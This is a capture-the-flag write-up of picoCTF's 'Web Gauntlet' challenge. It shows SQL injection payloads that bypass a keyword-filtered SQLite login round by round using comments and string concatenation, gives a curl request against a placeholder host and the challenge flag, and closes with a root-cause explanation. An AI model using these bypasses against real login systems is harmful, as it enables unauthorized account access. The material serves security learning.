# Web Gauntlet

**Platform:** CyLab Security Academy (picoCTF)
**Category:** Web Exploitation
**Difficulty:** Medium
**Flag:** `picoCTF{y0u_m4d3_1t_79a0ddc6}`

## Summary

The original entry in the "Web Gauntlet" series: a filtered SQLite login gated behind five
rounds, each round adding more blocked keywords on top of the last (tracked server-side in
`$_SESSION["round"]`). Unlike the later, tighter Gauntlet 2/3 challenges, this one never blocks
the unterminated-comment trick, so two small techniques (a dangling `/*` block comment, and
string concatenation to spell `admin` without the literal substring) carry through every round
unmodified.

## Discovery

`filter.php` reveals the active round's blocklist and increments as each round is beaten:

```
Round1: or
Round2: or and like = --
Round3:   or and = like > < --
Round4:   or and = like > < -- admin
Round5:   or and = like > < -- union admin
```

`index.php` echoes the assembled SQL query and any SQLite parse warning, making it a fully
interactive oracle, e.g. a stray unbalanced quote:

```
SELECT * FROM users WHERE username='admin'/*' AND password='*/'
Warning: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: "'"
```

## Proof of Concept

**Round 1** (`or` blocked): a classic quote-and-comment bypass doesn't need `or` at all —

```
user=admin'--
```

**Rounds 2–3** (`--` now blocked too, `and`/`=`/`like`/`>`/`<` also blocked but unused): switch
to a block comment. SQLite tolerates a `/*` comment left open through end-of-input — it doesn't
need a matching `*/` if nothing meaningful follows:

```
user=admin'/*
pass=x
```

`username='admin'/*' AND password='x'` — the block comment swallows the trailing
`' AND password='x'` unclosed, leaving a clean `username='admin'` check.

**Rounds 4–5** (`admin` itself now blocked): reconstruct the word from two fragments joined with
SQLite's `||` concatenation operator, so the literal substring `admin` never appears in the
request:

```
user=adm'||'in'/*
pass=x
```

`username='adm'||'in'/*' AND password='x'` → `username='admin'` via concatenation, same
open-comment trick swallowing the rest. This single payload also cleared round 5 (`union` added
to the blocklist, but never used).

```
curl -s -b cookies.txt -c cookies.txt -X POST "http://TARGET/index.php" \
  --data-urlencode "user=adm'||'in'/*" \
  --data-urlencode "pass=x"
```

```
Congrats! You won! Check out filter.php
```

Session state persists the round counter, so revisiting `filter.php` with the same session
dumps its own source once `round >= 6`, containing the flag:

```php
// picoCTF{y0u_m4d3_1t_79a0ddc6}
```

The source also reveals the *intended* per-round blocklists were considerably larger than what
was actually enforced (commented-out `$filter` arrays listing `union`, `select`, `insert`,
`delete`, `if`, `else`, `true`, `false`, `unhex`, `char`, `/*`, `*/`, etc.) — the deployed
challenge only turned on a subset, which is why the same two-technique payload cleared every
round without needing the extra bypasses developed for Gauntlet 2/3.

## Root Cause

Same as the rest of the series: denylist filtering over raw request text instead of
parameterized queries, plus an incomplete denylist (missing `/*`, never blocking unterminated
comments) that leaves a straightforward bypass available through all five rounds.

## CWE / OWASP

- **CWE-89**: SQL Injection
- **CWE-184**: Incomplete List of Disallowed Inputs
- **OWASP A03:2021**: Injection
